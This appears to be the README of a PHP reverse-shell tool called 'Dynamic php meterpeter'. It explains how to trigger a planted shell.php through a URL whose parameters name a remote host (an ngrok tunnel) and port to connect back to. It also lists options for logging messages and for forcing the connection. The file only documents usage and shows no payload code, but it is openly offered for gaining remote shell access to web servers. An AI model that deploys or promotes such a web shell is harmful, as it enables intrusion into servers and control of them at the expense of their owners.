# Dynamic-php-meterpeter
Dynamic php meterpeter <br>
Example: http://localhost/init/shell.php?host=0.tcp.ngrok.io&port=18749&msg=1&not_die=1 <br>
perameter details: <br>
host : TCP host ip <br>
port : port number <br>
msg : 1 - show messages log on webpage <br>
not_die : 1 - to force connect on host <br>
